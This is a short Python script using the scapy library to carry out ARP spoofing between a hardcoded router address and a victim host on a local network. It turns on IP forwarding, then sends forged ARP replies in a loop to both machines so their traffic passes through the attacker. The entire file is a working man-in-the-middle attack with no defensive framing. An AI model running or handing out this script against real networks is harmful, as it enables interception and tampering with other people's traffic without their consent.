#!/usr/bin/env python

import scapy.all  as scapy
import time
import subprocess
import sys

subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)
# subprocess.call('clear', shell=True)

def get_mac(ip):
    arp_request=scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast= broadcast/arp_request
    answered_list=scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    return(answered_list[0][1].hwsrc)


def spoof(target_ip, spoof_ip):
    target_mac=get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# print('\rTarget found')

try:
    sent_packets_count=0
    while True:
        spoof('192.168.1.1','192.168.1.126')
        spoof('192.168.1.126', '192.168.1.1')
        if sent_packets_count==0:
            print('[+] Target found')
        sent_packets_count=sent_packets_count+2
        print('\r[+] Packets sent:  '+ str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(1)

except IndexError:
    print('\r[*] Searching for target')
